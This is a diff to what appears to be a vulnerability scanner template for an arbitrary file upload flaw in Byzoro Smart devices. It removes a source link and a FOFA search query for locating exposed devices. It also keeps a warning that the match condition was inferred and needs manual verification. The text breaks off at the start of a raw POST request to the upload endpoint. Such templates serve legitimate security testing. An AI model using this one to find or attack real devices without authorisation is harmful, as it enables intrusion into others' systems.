@@ -3,14 +3,8 @@ info:
   name: 百卓Smartuploadfile存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2128e620977bda91ed844b5d49049768
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 2128e620977bda91ed844b5d49049768
-    fofa: + fofa`app="byzoro-Smart"`
 http:
 - raw:
   - 'POST /Tool/uploadfile.php? HTTP/1.1
